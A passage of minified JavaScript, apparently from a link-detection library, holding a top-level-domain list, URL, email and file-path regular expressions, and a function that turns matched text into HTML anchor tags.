COFFEE|COLLEGE|COLOGNE|COM|COMCAST|COMMBANK|COMMUNITY|COMPANY|COMPARE|COMPUTER|COMSEC|CONDOS|CONSTRUCTION|CONSULTING|CONTACT|CONTRACTORS|COOKING|COOKINGCHANNEL|COOL|COOP|CORSICA|COUNTRY|COUPON|COUPONS|COURSES|CPA|CR|CREDIT|CREDITCARD|CREDITUNION|CRICKET|CROWN|CRS|CRUISE|CRUISES|CSC|CU|CUISINELLA|CV|CW|CX|CY|CYMRU|CYOU|CZ|DABUR|DAD|DANCE|DATA|DATE|DATING|DATSUN|DAY|DCLK|DDS|DE|DEAL|DEALER|DEALS|DEGREE|DELIVERY|DELL|DELOITTE|DELTA|DEMOCRAT|DENTAL|DENTIST|DESI|DESIGN|DEV|DHL|DIAMONDS|DIET|DIGITAL|DIRECT|DIRECTORY|DISCOUNT|DISCOVER|DISH|DIY|DJ|DK|DM|DNP|DO|DOCS|DOCTOR|DOG|DOMAINS|DOT|DOWNLOAD|DRIVE|DTV|DUBAI|DUCK|DUNLOP|DUPONT|DURBAN|DVAG|DVR|DZ|EARTH|EAT|EC|ECO|EDEKA|EDU|EDUCATION|EE|EG|EMAIL|EMERCK|ENERGY|ENGINEER|ENGINEERING|ENTERPRISES|EPSON|EQUIPMENT|ER|ERICSSON|ERNI|ES|ESQ|ESTATE|ESURANCE|ET|ETISALAT|EU|EUROVISION|EUS|EVENTS|EXCHANGE|EXPERT|EXPOSED|EXPRESS|EXTRASPACE|FAGE|FAIL|FAIRWINDS|FAITH|FAMILY|FAN|FANS|FARM|FARMERS|FASHION|FAST|FEDEX|FEEDBACK|FERRARI|FERRERO|FI|FIAT|FIDELITY|FIDO|FILM|FINAL|FINANCE|FINANCIAL|FIRE|FIRESTONE|FIRMDALE|FISH|FISHING|FIT|FITNESS|FJ|FK|FLICKR|FLIGHTS|FLIR|FLORIST|FLOWERS|FLY|FM|FO|FOO|FOOD|FOODNETWORK|FOOTBALL|FORD|FOREX|FORSALE|FORUM|FOUNDATION|FOX|FR|FREE|FRESENIUS|FRL|FROGANS|FRONTDOOR|FRONTIER|FTR|FUJITSU|FUJIXEROX|FUN|FUND|FURNITURE|FUTBOL|FYI|GA|GAL|GALLERY|GALLO|GALLUP|GAME|GAMES|GAP|GARDEN|GAY|GB|GBIZ|GD|GDN|GE|GEA|GENT|GENTING|GEORGE|GF|GG|GGEE|GH|GI|GIFT|GIFTS|GIVES|GIVING|GL|GLADE|GLASS|GLE|GLOBAL|GLOBO|GM|GMAIL|GMBH|GMO|GMX|GN|GODADDY|GOLD|GOLDPOINT|GOLF|GOO|GOODYEAR|GOOG|GOOGLE|GOP|GOT|GOV|GP|GQ|GR|GRAINGER|GRAPHICS|GRATIS|GREEN|GRIPE|GROCERY|GROUP|GS|GT|GU|GUARDIAN|GUCCI|GUGE|GUIDE|GUITARS|GURU|GW|GY|HAIR|HAMBURG|HANGOUT|HAUS|HBO|HDFC|HDFCBANK|HEALTH|HEALTHCARE|HELP|HELSINKI|HERE|HERMES|HGTV|HIPHOP|HISAMITSU|HITACHI|HIV|HK|HKT|HM|HN|HOCKEY|HOLDINGS|HOLIDAY|HOMEDEPOT|HOMEGOODS|HOMES|HOMESENSE|HONDA|HORSE|HOSPITAL|HOST|HOSTING|HOT|HOTELES|HOTELS|HOTMAIL|HOUSE|HOW|HR|HSBC|HT|HU|HUGHES|HYATT|HYUNDAI|IBM|ICBC|ICE|ICU|ID|IE|IEEE|IFM|IKANO|IL|IM|IMAMAT|IMDB|IMMO|IMMOBILIEN|IN|INC|INDUSTRIES|INFINITI|INFO|ING|INK|INSTITUTE|INSURANCE|INSURE|INT|INTEL|INTERNATIONAL|INTUIT|INVESTMENTS|IO|IPIRANGA|IQ|IR|IRISH|IS|ISMAILI|IST|ISTANBUL|IT|ITAU|ITV|IVECO|JAGUAR|JAVA|JCB|JCP|JE|JEEP|JETZT|JEWELRY|JIO|JLL|JM|JMP|JNJ|JO|JOBS|JOBURG|JOT|JOY|JP|JPMORGAN|JPRS|JUEGOS|JUNIPER|KAUFEN|KDDI|KE|KERRYHOTELS|KERRYLOGISTICS|KERRYPROPERTIES|KFH|KG|KH|KI|KIA|KIM|KINDER|KINDLE|KITCHEN|KIWI|KM|KN|KOELN|KOMATSU|KOSHER|KP|KPMG|KPN|KR|KRD|KRED|KUOKGROUP|KW|KY|KYOTO|KZ|LA|LACAIXA|LAMBORGHINI|LAMER|LANCASTER|LANCIA|LAND|LANDROVER|LANXESS|LASALLE|LAT|LATINO|LATROBE|LAW|LAWYER|LB|LC|LDS|LEASE|LECLERC|LEFRAK|LEGAL|LEGO|LEXUS|LGBT|LI|LIDL|LIFE|LIFEINSURANCE|LIFESTYLE|LIGHTING|LIKE|LILLY|LIMITED|LIMO|LINCOLN|LINDE|LINK|LIPSY|LIVE|LIVING|LIXIL|LK|LLC|LLP|LOAN|LOANS|LOCKER|LOCUS|LOFT|LOL|LONDON|LOTTE|LOTTO|LOVE|LPL|LPLFINANCIAL|LR|LS|LT|LTD|LTDA|LU|LUNDBECK|LUPIN|LUXE|LUXURY|LV|LY|MA|MACYS|MADRID|MAIF|MAISON|MAKEUP|MAN|MANAGEMENT|MANGO|MAP|MARKET|MARKETING|MARKETS|MARRIOTT|MARSHALLS|MASERATI|MATTEL|MBA|MC|MCKINSEY|MD|ME|MED|MEDIA|MEET|MELBOURNE|MEME|MEMORIAL|MEN|MENU|MERCKMSD|METLIFE|MG|MH|MIAMI|MICROSOFT|MIL|MINI|MINT|MIT|MITSUBISHI|MK|ML|MLB|MLS|MM|MMA|MN|MO|MOBI|MOBILE|MODA|MOE|MOI|MOM|MONASH|MONEY|MONSTER|MORMON|MORTGAGE|MOSCOW|MOTO|MOTORCYCLES|MOV|MOVIE|MP|MQ|MR|MS|MSD|MT|MTN|MTR|MU|MUSEUM|MUTUAL|MV|MW|MX|MY|MZ|NA|NAB|NAGOYA|NAME|NATIONWIDE|NATURA|NAVY|NBA|NC|NE|NEC|NET|NETBANK|NETFLIX|NETWORK|NEUSTAR|NEW|NEWHOLLAND|NEWS|NEXT|NEXTDIRECT|NEXUS|NF|NFL|NG|NGO|NHK|NI|NICO|NIKE|NIKON|NINJA|NISSAN|NISSAY|NL|NO|NOKIA|NORTHWESTERNMUTUAL|NORTON|NOW|NOWRUZ|NOWTV|NP|NR|NRA|NRW|NTT|NU|NYC|NZ|OBI|OBSERVER|OFF|OFFICE|OKINAWA|OLAYAN|OLAYANGROUP|OLDNAVY|OLLO|OM|OMEGA|ONE|ONG|ONL|ONLINE|ONYOURSIDE|OOO|OPEN|ORACLE|ORANGE|ORG|ORGANIC|ORIGINS|OSAKA|OTSUKA|OTT|OVH|PA|PAGE|PANASONIC|PARIS|PARS|PARTNERS|PARTS|PARTY|PASSAGENS|PAY|PCCW|PE|PET|PF|PFIZER|PG|PH|PHARMACY|PHD|PHILIPS|PHONE|PHOTO|PHOTOGRAPHY|PHOTOS|PHYSIO|PICS|PICTET|PICTURES|PID|PIN|PING|PINK|PIONEER|PIZZA|PK|PL|PLACE|PLAY|PLAYSTATION|PLUMBING|PLUS|PM|PN|PNC|POHL|POKER|POLITIE|PORN|POST|PR|PRAMERICA|PRAXI|PRESS|PRIME|PRO|PROD|PRODUCTIONS|PROF|PROGRESSIVE|PROMO|PROPERTIES|PROPERTY|PROTECTION|PRU|PRUDENTIAL|PS|PT|PUB|PW|PWC|PY|QA|QPON|QUEBEC|QUEST|QVC|RACING|RADIO|RAID|RE|READ|REALESTATE|REALTOR|REALTY|RECIPES|RED|REDSTONE|REDUMBRELLA|REHAB|REISE|REISEN|REIT|RELIANCE|REN|RENT|RENTALS|REPAIR|REPORT|REPUBLICAN|REST|RESTAURANT|REVIEW|REVIEWS|REXROTH|RICH|RICHARDLI|RICOH|RIGHTATHOME|RIL|RIO|RIP|RMIT|RO|ROCHER|ROCKS|RODEO|ROGERS|ROOM|RS|RSVP|RU|RUGBY|RUHR|RUN|RW|RWE|RYUKYU|SA|SAARLAND|SAFE|SAFETY|SAKURA|SALE|SALON|SAMSCLUB|SAMSUNG|SANDVIK|SANDVIKCOROMANT|SANOFI|SAP|SARL|SAS|SAVE|SAXO|SB|SBI|SBS|SC|SCA|SCB|SCHAEFFLER|SCHMIDT|SCHOLARSHIPS|SCHOOL|SCHULE|SCHWARZ|SCIENCE|SCJOHNSON|SCOR|SCOT|SD|SE|SEARCH|SEAT|SECURE|SECURITY|SEEK|SELECT|SENER|SERVICES|SES|SEVEN|SEW|SEX|SEXY|SFR|SG|SH|SHANGRILA|SHARP|SHAW|SHELL|SHIA|SHIKSHA|SHOES|SHOP|SHOPPING|SHOUJI|SHOW|SHOWTIME|SHRIRAM|SI|SILK|SINA|SINGLES|SITE|SJ|SK|SKI|SKIN|SKY|SKYPE|SL|SLING|SM|SMART|SMILE|SN|SNCF|SO|SOCCER|SOCIAL|SOFTBANK|SOFTWARE|SOHU|SOLAR|SOLUTIONS|SONG|SONY|SOY|SPACE|SPORT|SPOT|SPREADBETTING|SR|SRL|SS|ST|STADA|STAPLES|STAR|STATEBANK|STATEFARM|STC|STCGROUP|STOCKHOLM|STORAGE|STORE|STREAM|STUDIO|STUDY|STYLE|SU|SUCKS|SUPPLIES|SUPPLY|SUPPORT|SURF|SURGERY|SUZUKI|SV|SWATCH|SWIFTCOVER|SWISS|SX|SY|SYDNEY|SYMANTEC|SYSTEMS|SZ|TAB|TAIPEI|TALK|TAOBAO|TARGET|TATAMOTORS|TATAR|TATTOO|TAX|TAXI|TC|TCI|TD|TDK|TEAM|TECH|TECHNOLOGY|TEL|TEMASEK|TENNIS|TEVA|TF|TG|TH|THD|THEATER|THEATRE|TIAA|TICKETS|TIENDA|TIFFANY|TIPS|TIRES|TIROL|TJ|TJMAXX|TJX|TK|TKMAXX|TL|TM|TMALL|TN|TO|TODAY|TOKYO|TOOLS|TOP|TORAY|TOSHIBA|TOTAL|TOURS|TOWN|TOYOTA|TOYS|TR|TRADE|TRADING|TRAINING|TRAVEL|TRAVELCHANNEL|TRAVELERS|TRAVELERSINSURANCE|TRUST|TRV|TT|TUBE|TUI|TUNES|TUSHU|TV|TVS|TW|TZ|UA|UBANK|UBS|UG|UK|UNICOM|UNIVERSITY|UNO|UOL|UPS|US|UY|UZ|VA|VACATIONS|VANA|VANGUARD|VC|VE|VEGAS|VENTURES|VERISIGN|VERSICHERUNG|VET|VG|VI|VIAJES|VIDEO|VIG|VIKING|VILLAS|VIN|VIP|VIRGIN|VISA|VISION|VIVA|VIVO|VLAANDEREN|VN|VODKA|VOLKSWAGEN|VOLVO|VOTE|VOTING|VOTO|VOYAGE|VU|VUELOS|WALES|WALMART|WALTER|WANG|WANGGOU|WATCH|WATCHES|WEATHER|WEATHERCHANNEL|WEBCAM|WEBER|WEBSITE|WED|WEDDING|WEIBO|WEIR|WF|WHOSWHO|WIEN|WIKI|WILLIAMHILL|WIN|WINDOWS|WINE|WINNERS|WME|WOLTERSKLUWER|WOODSIDE|WORK|WORKS|WORLD|WOW|WS|WTC|WTF|XBOX|XEROX|XFINITY|XIHUAN|XIN|XN--11B4C3D|XN--1CK2E1B|XN--1QQW23A|XN--2SCRJ9C|XN--30RR7Y|XN--3BST00M|XN--3DS443G|XN--3E0B707E|XN--3HCRJ9C|XN--3OQ18VL8PN36A|XN--3PXU8K|XN--42C2D9A|XN--45BR5CYL|XN--45BRJ9C|XN--45Q11C|XN--4GBRIM|XN--54B7FTA0CC|XN--55QW42G|XN--55QX5D|XN--5SU34J936BGSG|XN--5TZM5G|XN--6FRZ82G|XN--6QQ986B3XL|XN--80ADXHKS|XN--80AO21A|XN--80AQECDR1A|XN--80ASEHDB|XN--80ASWG|XN--8Y0A063A|XN--90A3AC|XN--90AE|XN--90AIS|XN--9DBQ2A|XN--9ET52U|XN--9KRT00A|XN--B4W605FERD|XN--BCK1B9A5DRE4C|XN--C1AVG|XN--C2BR7G|XN--CCK2B3B|XN--CG4BKI|XN--CLCHC0EA0B2G2A9GCD|XN--CZR694B|XN--CZRS0T|XN--CZRU2D|XN--D1ACJ3B|XN--D1ALF|XN--E1A4C|XN--ECKVDTC9D|XN--EFVY88H|XN--FCT429K|XN--FHBEI|XN--FIQ228C5HS|XN--FIQ64B|XN--FIQS8S|XN--FIQZ9S|XN--FJQ720A|XN--FLW351E|XN--FPCRJ9C3D|XN--FZC2C9E2C|XN--FZYS8D69UVGM|XN--G2XX48C|XN--GCKR3F0F|XN--GECRJ9C|XN--GK3AT1E|XN--H2BREG3EVE|XN--H2BRJ9C|XN--H2BRJ9C8C|XN--HXT814E|XN--I1B6B1A6A2E|XN--IMR513N|XN--IO0A7I|XN--J1AEF|XN--J1AMH|XN--J6W193G|XN--JLQ61U9W7B|XN--JVR189M|XN--KCRX77D1X4A|XN--KPRW13D|XN--KPRY57D|XN--KPU716F|XN--KPUT3I|XN--L1ACC|XN--LGBBAT1AD8J|XN--MGB9AWBF|XN--MGBA3A3EJT|XN--MGBA3A4F16A|XN--MGBA7C0BBN0A|XN--MGBAAKC7DVF|XN--MGBAAM7A8H|XN--MGBAB2BD|XN--MGBAH1A3HJKRD|XN--MGBAI9AZGQP6J|XN--MGBAYH7GPA|XN--MGBBH1A|XN--MGBBH1A71E|XN--MGBC0A9AZCG|XN--MGBCA7DZDO|XN--MGBCPQ6GPA1A|XN--MGBERP4A5D4AR|XN--MGBGU82A|XN--MGBI4ECEXP|XN--MGBPL2FH|XN--MGBT3DHD|XN--MGBTX2B|XN--MGBX4CD0AB|XN--MIX891F|XN--MK1BU44C|XN--MXTQ1M|XN--NGBC5AZD|XN--NGBE9E0A|XN--NGBRX|XN--NODE|XN--NQV7F|XN--NQV7FS00EMA|XN--NYQY26A|XN--O3CW4H|XN--OGBPF8FL|XN--OTU796D|XN--P1ACF|XN--P1AI|XN--PBT977C|XN--PGBS0DH|XN--PSSY2U|XN--Q7CE6A|XN--Q9JYB4C|XN--QCKA1PMC|XN--QXA6A|XN--QXAM|XN--RHQV96G|XN--ROVU88B|XN--RVC1E0AM3E|XN--S9BRJ9C|XN--SES554G|XN--T60B56A|XN--TCKWE|XN--TIQ49XQYJ|XN--UNUP4Y|XN--VERMGENSBERATER-CTB|XN--VERMGENSBERATUNG-PWB|XN--VHQUV|XN--VUQ861B|XN--W4R85EL8FHU5DNRA|XN--W4RS40L|XN--WGBH1C|XN--WGBL6A|XN--XHQ521B|XN--XKC2AL3HYE2A|XN--XKC2DL3A5EE0H|XN--Y9A3AQ|XN--YFRO4I67O|XN--YGBI2AMMX|XN--ZFR164B|XXX|XYZ|YACHTS|YAHOO|YAMAXUN|YANDEX|YE|YODOBASHI|YOGA|YOKOHAMA|YOU|YOUTUBE|YT|YUN|ZA|ZAPPOS|ZARA|ZERO|ZIP|ZM|ZONE|ZUERICH|ZW|TEST)"
    });
    b(h);
    h.TLDs;
    var a = c(function(e, k) {
        Object.defineProperty(k, "__esModule", {
            value: !0
        }), k.openingParenthesis = "([\"'{", k.closingParenthesis = ")]\"'}", k.parenthesis = k.openingParenthesis.split("").map(function(l, m) {
            return "" + l + k.closingParenthesis.charAt(m)
        }), k.htmlAttributes = ["src", "data", "href", "cite", "formaction", "icon", "manifest", "poster", "codebase", "background", "profile", "usemap", "itemtype", "action", "longdesc", "classid", "archive"], k.nonLatinAlphabetRanges = "\\u0041-\\u005A\\u0061-\\u007A\\u00AA\\u00B5\\u00BA\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02C1\\u02C6-\\u02D1\\u02E0-\\u02E4\\u02EC\\u02EE\\u0370-\\u0374\\u0376\\u0377\\u037A-\\u037D\\u0386\\u0388-\\u038A\\u038C\\u038E-\\u03A1\\u03A3-\\u03F5\\u03F7-\\u0481\\u048A-\\u0527\\u0531-\\u0556\\u0559\\u0561-\\u0587\\u05D0-\\u05EA\\u05F0-\\u05F2\\u0620-\\u064A\\u066E\\u066F\\u0671-\\u06D3\\u06D5\\u06E5\\u06E6\\u06EE\\u06EF\\u06FA-\\u06FC\\u06FF\\u0710\\u0712-\\u072F\\u074D-\\u07A5\\u07B1\\u07CA-\\u07EA\\u07F4\\u07F5\\u07FA\\u0800-\\u0815\\u081A\\u0824\\u0828\\u0840-\\u0858\\u08A0\\u08A2-\\u08AC\\u0904-\\u0939\\u093D\\u0950\\u0958-\\u0961\\u0971-\\u0977\\u0979-\\u097F\\u0985-\\u098C\\u098F\\u0990\\u0993-\\u09A8\\u09AA-\\u09B0\\u09B2\\u09B6-\\u09B9\\u09BD\\u09CE\\u09DC\\u09DD\\u09DF-\\u09E1\\u09F0\\u09F1\\u0A05-\\u0A0A\\u0A0F\\u0A10\\u0A13-\\u0A28\\u0A2A-\\u0A30\\u0A32\\u0A33\\u0A35\\u0A36\\u0A38\\u0A39\\u0A59-\\u0A5C\\u0A5E\\u0A72-\\u0A74\\u0A85-\\u0A8D\\u0A8F-\\u0A91\\u0A93-\\u0AA8\\u0AAA-\\u0AB0\\u0AB2\\u0AB3\\u0AB5-\\u0AB9\\u0ABD\\u0AD0\\u0AE0\\u0AE1\\u0B05-\\u0B0C\\u0B0F\\u0B10\\u0B13-\\u0B28\\u0B2A-\\u0B30\\u0B32\\u0B33\\u0B35-\\u0B39\\u0B3D\\u0B5C\\u0B5D\\u0B5F-\\u0B61\\u0B71\\u0B83\\u0B85-\\u0B8A\\u0B8E-\\u0B90\\u0B92-\\u0B95\\u0B99\\u0B9A\\u0B9C\\u0B9E\\u0B9F\\u0BA3\\u0BA4\\u0BA8-\\u0BAA\\u0BAE-\\u0BB9\\u0BD0\\u0C05-\\u0C0C\\u0C0E-\\u0C10\\u0C12-\\u0C28\\u0C2A-\\u0C33\\u0C35-\\u0C39\\u0C3D\\u0C58\\u0C59\\u0C60\\u0C61\\u0C85-\\u0C8C\\u0C8E-\\u0C90\\u0C92-\\u0CA8\\u0CAA-\\u0CB3\\u0CB5-\\u0CB9\\u0CBD\\u0CDE\\u0CE0\\u0CE1\\u0CF1\\u0CF2\\u0D05-\\u0D0C\\u0D0E-\\u0D10\\u0D12-\\u0D3A\\u0D3D\\u0D4E\\u0D60\\u0D61\\u0D7A-\\u0D7F\\u0D85-\\u0D96\\u0D9A-\\u0DB1\\u0DB3-\\u0DBB\\u0DBD\\u0DC0-\\u0DC6\\u0E01-\\u0E30\\u0E32\\u0E33\\u0E40-\\u0E46\\u0E81\\u0E82\\u0E84\\u0E87\\u0E88\\u0E8A\\u0E8D\\u0E94-\\u0E97\\u0E99-\\u0E9F\\u0EA1-\\u0EA3\\u0EA5\\u0EA7\\u0EAA\\u0EAB\\u0EAD-\\u0EB0\\u0EB2\\u0EB3\\u0EBD\\u0EC0-\\u0EC4\\u0EC6\\u0EDC-\\u0EDF\\u0F00\\u0F40-\\u0F47\\u0F49-\\u0F6C\\u0F88-\\u0F8C\\u1000-\\u102A\\u103F\\u1050-\\u1055\\u105A-\\u105D\\u1061\\u1065\\u1066\\u106E-\\u1070\\u1075-\\u1081\\u108E\\u10A0-\\u10C5\\u10C7\\u10CD\\u10D0-\\u10FA\\u10FC-\\u1248\\u124A-\\u124D\\u1250-\\u1256\\u1258\\u125A-\\u125D\\u1260-\\u1288\\u128A-\\u128D\\u1290-\\u12B0\\u12B2-\\u12B5\\u12B8-\\u12BE\\u12C0\\u12C2-\\u12C5\\u12C8-\\u12D6\\u12D8-\\u1310\\u1312-\\u1315\\u1318-\\u135A\\u1380-\\u138F\\u13A0-\\u13F4\\u1401-\\u166C\\u166F-\\u167F\\u1681-\\u169A\\u16A0-\\u16EA\\u1700-\\u170C\\u170E-\\u1711\\u1720-\\u1731\\u1740-\\u1751\\u1760-\\u176C\\u176E-\\u1770\\u1780-\\u17B3\\u17D7\\u17DC\\u1820-\\u1877\\u1880-\\u18A8\\u18AA\\u18B0-\\u18F5\\u1900-\\u191C\\u1950-\\u196D\\u1970-\\u1974\\u1980-\\u19AB\\u19C1-\\u19C7\\u1A00-\\u1A16\\u1A20-\\u1A54\\u1AA7\\u1B05-\\u1B33\\u1B45-\\u1B4B\\u1B83-\\u1BA0\\u1BAE\\u1BAF\\u1BBA-\\u1BE5\\u1C00-\\u1C23\\u1C4D-\\u1C4F\\u1C5A-\\u1C7D\\u1CE9-\\u1CEC\\u1CEE-\\u1CF1\\u1CF5\\u1CF6\\u1D00-\\u1DBF\\u1E00-\\u1F15\\u1F18-\\u1F1D\\u1F20-\\u1F45\\u1F48-\\u1F4D\\u1F50-\\u1F57\\u1F59\\u1F5B\\u1F5D\\u1F5F-\\u1F7D\\u1F80-\\u1FB4\\u1FB6-\\u1FBC\\u1FBE\\u1FC2-\\u1FC4\\u1FC6-\\u1FCC\\u1FD0-\\u1FD3\\u1FD6-\\u1FDB\\u1FE0-\\u1FEC\\u1FF2-\\u1FF4\\u1FF6-\\u1FFC\\u2071\\u207F\\u2090-\\u209C\\u2102\\u2107\\u210A-\\u2113\\u2115\\u2119-\\u211D\\u2124\\u2126\\u2128\\u212A-\\u212D\\u212F-\\u2139\\u213C-\\u213F\\u2145-\\u2149\\u214E\\u2183\\u2184\\u2C00-\\u2C2E\\u2C30-\\u2C5E\\u2C60-\\u2CE4\\u2CEB-\\u2CEE\\u2CF2\\u2CF3\\u2D00-\\u2D25\\u2D27\\u2D2D\\u2D30-\\u2D67\\u2D6F\\u2D80-\\u2D96\\u2DA0-\\u2DA6\\u2DA8-\\u2DAE\\u2DB0-\\u2DB6\\u2DB8-\\u2DBE\\u2DC0-\\u2DC6\\u2DC8-\\u2DCE\\u2DD0-\\u2DD6\\u2DD8-\\u2DDE\\u2E2F\\u3005\\u3006\\u3031-\\u3035\\u303B\\u303C\\u3041-\\u3096\\u309D-\\u309F\\u30A1-\\u30FA\\u30FC-\\u30FF\\u3105-\\u312D\\u3131-\\u318E\\u31A0-\\u31BA\\u31F0-\\u31FF\\u3400-\\u4DB5\\u4E00-\\u9FCC\\uA000-\\uA48C\\uA4D0-\\uA4FD\\uA500-\\uA60C\\uA610-\\uA61F\\uA62A\\uA62B\\uA640-\\uA66E\\uA67F-\\uA697\\uA6A0-\\uA6E5\\uA717-\\uA71F\\uA722-\\uA788\\uA78B-\\uA78E\\uA790-\\uA793\\uA7A0-\\uA7AA\\uA7F8-\\uA801\\uA803-\\uA805\\uA807-\\uA80A\\uA80C-\\uA822\\uA840-\\uA873\\uA882-\\uA8B3\\uA8F2-\\uA8F7\\uA8FB\\uA90A-\\uA925\\uA930-\\uA946\\uA960-\\uA97C\\uA984-\\uA9B2\\uA9CF\\uAA00-\\uAA28\\uAA40-\\uAA42\\uAA44-\\uAA4B\\uAA60-\\uAA76\\uAA7A\\uAA80-\\uAAAF\\uAAB1\\uAAB5\\uAAB6\\uAAB9-\\uAABD\\uAAC0\\uAAC2\\uAADB-\\uAADD\\uAAE0-\\uAAEA\\uAAF2-\\uAAF4\\uAB01-\\uAB06\\uAB09-\\uAB0E\\uAB11-\\uAB16\\uAB20-\\uAB26\\uAB28-\\uAB2E\\uABC0-\\uABE2\\uAC00-\\uD7A3\\uD7B0-\\uD7C6\\uD7CB-\\uD7FB\\uF900-\\uFA6D\\uFA70-\\uFAD9\\uFB00-\\uFB06\\uFB13-\\uFB17\\uFB1D\\uFB1F-\\uFB28\\uFB2A-\\uFB36\\uFB38-\\uFB3C\\uFB3E\\uFB40\\uFB41\\uFB43\\uFB44\\uFB46-\\uFBB1\\uFBD3-\\uFD3D\\uFD50-\\uFD8F\\uFD92-\\uFDC7\\uFDF0-\\uFDFB\\uFE70-\\uFE74\\uFE76-\\uFEFC\\uFF21-\\uFF3A\\uFF41-\\uFF5A\\uFF66-\\uFFBE\\uFFC2-\\uFFC7\\uFFCA-\\uFFCF\\uFFD2-\\uFFD7\\uFFDA-\\uFFDC", k.TLDs = h.TLDs
    });
    b(a);
    a.openingParenthesis, a.closingParenthesis, a.parenthesis, a.htmlAttributes, a.nonLatinAlphabetRanges, a.TLDs;
    var j = c(function(e, k) {
        function l(m, n, o) {
            return "function" == typeof o ? o(m, n) : o
        }
        Object.defineProperty(k, "__esModule", {
            value: !0
        }), k.transform = function(m, o) {
            var q = "",
                t = 1 / 0,
                s = {},
                r = !1;
            if (o && o.specialTransform) {
                for (var n = 0; n < o.specialTransform.length; n++) {
                    var p = o.specialTransform[n];
                    if (p.test.test(m.string)) {
                        return p.transform(m.string, m)
                    }
                }
            }
            return o && o.exclude && l(m.string, m, o.exclude) ? m.string : (o && o.protocol && (q = l(m.string, m, o.protocol)), q = m.protocol ? "" : q || (m.isEmail ? "mailto:" : m.isFile ? "file:///" : "http://"), o && o.truncate && (t = l(m.string, m, o.truncate)), o && o.middleTruncation && (r = l(m.string, m, o.middleTruncation)), o && o.attributes && (s = l(m.string, m, o.attributes)), "<a " + Object.keys(s).map(function(u) {
                return !0 === s[u] ? u : u + '="' + s[u] + '" '
            }).join(" ") + 'href="' + q + m.string + '">' + (m.string.length > t ? r ? m.string.substring(0, Math.floor(t / 2)) + "…" + m.string.substring(m.string.length - Math.ceil(t / 2), m.string.length) : m.string.substring(0, t) + "…" : m.string) + "</a>")
        }
    });
    b(j);
    j.transform;
    var g = c(function(n, x) {
        Object.defineProperty(x, "__esModule", {
            value: !0
        });
        var y = "([a-z0-9]+(-+[a-z0-9]+)*\\.)+(" + a.TLDs + ")",
            t = "a-zA-Z\\d\\-._~\\!$&*+,;=:@%'\"\\[\\]()",
            l = "((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)",
            r = "\\[(([a-f0-9:]+:+)+[a-f0-9]+)\\]",
            w = "(https?:|ftps?:)\\/\\/",
            q = "(((" + w + ")?(" + y + "|" + l + "|(" + w + ")(" + r + "|" + ("([a-z0-9]+(-+[a-z0-9]+)*\\.)+([a-z0-9][a-z0-9-]{0," + (Math.max.apply(d, a.TLDs.split("|").map(function(e) {
                return e.length
            })) - 2) + "}[a-z0-9])") + "))(?!@\\w)(:(\\d{1,5}))?)|(((https?:|ftps?:)\\/\\/)\\S+))",
            p = q + "((((\\/(([" + t + "]+(\\/[" + t + a.nonLatinAlphabetRanges + "]*)*))?)?)((\\?([" + t + "\\/?]*))?)((\\#([" + t + "\\/?]*))?))?\\b((([" + t + "\\/" + a.nonLatinAlphabetRanges + "][a-zA-Z\\d\\-_~+=\\/" + a.nonLatinAlphabetRanges + "]+)?))+)";
        x.email = "\\b(mailto:)?([a-z0-9!#$%&'*+=?^_`{|}~-]+(\\.[a-z0-9!#$%&'*+=?^_`{|}~-]+)*)@(" + y + "|" + l + ")\\b", x.url = "(" + p + ")|(\\b" + q + "(((\\/(([a-zA-Z\\d\\-._~\\!$&*+,;=:@%'\"\\[\\]()]+(\\/[a-zA-Z\\d\\-._~\\!$&*+,;=:@%'\"\\[\\]()]*)*))?)?)((\\?([a-zA-Z\\d\\-._~\\!$&*+,;=:@%'\"\\[\\]()\\/?]*))?)((\\#([a-zA-Z\\d\\-._~\\!$&*+,;=:@%'\"\\[\\]()\\/?]*))?))?\\b(([\\/]?))+)", x.file = "(file:\\/\\/\\/)([a-z]+:(\\/|\\\\)+)?([\\w.]+([\\/\\\\]?)+)+", x["final"] = "(" + x.url + ")|(" + x.email + ")|(" + x.file + ")", x.finalRegex = new RegExp(x["final"], "gi"), x.ipRegex = new RegExp("^(" + l + "|" + r + ")$", "i"), x.emailRegex = new RegExp("^(" + x.email + ")$", "i"), x.fileRegex = new RegExp("^(" + x.file + ")$", "i"), x.urlRegex = new RegExp("^(" + x.url + ")$", "i");
        var o = {
            isURL: 0,
            isEmail: 0,
            isFile: 0,
            file: {
                fileName: 0,
                protocol: 0
            },
            email: {
                protocol: 0,
                local: 0,
                host: 0
            },
            url: {
                ipv4: 0,
                ipv6: 0,
                ipv4Confirmation: 0,
                byProtocol: 0,
                port: 0,
                protocol1: 0,
                protocol2: 0,
                protocol3: 0,
                protocolWithDomain: 0,
                path: 0,
                secondPartOfPath: 0,
                query: 0,
                fragment: 0
            }
        };
        x.iidxes = o;
        for (var m = ["file:///some/file/path/filename.pdf", "mailto:e+_mail.me@sub.domain.com", "http://sub.domain.co.uk:3000/p/a/t/h_(asd)/h?q=abc123#dfdf", "http://www.عربي.com", "http://127.0.0.1:3000/p/a/t_(asd)/h?q=abc123#dfdf", "http://[2a00:1450:4025:401::67]/k/something", "a.org/abc/ი_გგ"].join(" "), s = null, k = 0; null !== (s = x.finalRegex.exec(m));) {
            0 === k && (o.isFile = s.lastIndexOf(s[0]), o.file.fileName = s.indexOf("filename.pdf"), o.file.protocol = s.indexOf("file:///")), 1 === k && (o.isEmail = s.lastIndexOf(s[0]), o.email.protocol = s.indexOf("mailto:"), o.email.local = s.indexOf("e+_mail.me"), o.email.host = s.indexOf("sub.domain.com")), 2 === k && (o.isURL = s.lastIndexOf(s[0]), o.url.protocol1 = s.indexOf("http://"), o.url.protocolWithDomain = s.indexOf("http://sub.domain.co.uk:3000"), o.url.port = s.indexOf("3000"), o.url.path = s.indexOf("/p/a/t/h_(asd)/h"), o.url.query = s.indexOf("q=abc123"), o.url.fragment = s.indexOf("dfdf")), 3 === k && (o.url.byProtocol = s.lastIndexOf("http://www.عربي.com"), o.url.protocol2 = s.lastIndexOf("http://")), 4 === k && (o.url.ipv4 = s.indexOf("127.0.0.1"), o.url.ipv4Confirmation = s.indexOf("0.")), 5 === k && (o.url.ipv6 = s.indexOf("2a00:1450:4025:401::67"), o.url.protocol3 = s.lastIndexOf("http://")), 6 === k && (o.url.secondPartOfPath = s.indexOf("გგ")), k++
        }
    });
    b(g);
    g.email, g.url, g.file, g.finalRegex, g.ipRegex, g.emailRegex, g.fileRegex, g.urlRegex, g.iidxes;
    var f = c(function(e, k) {
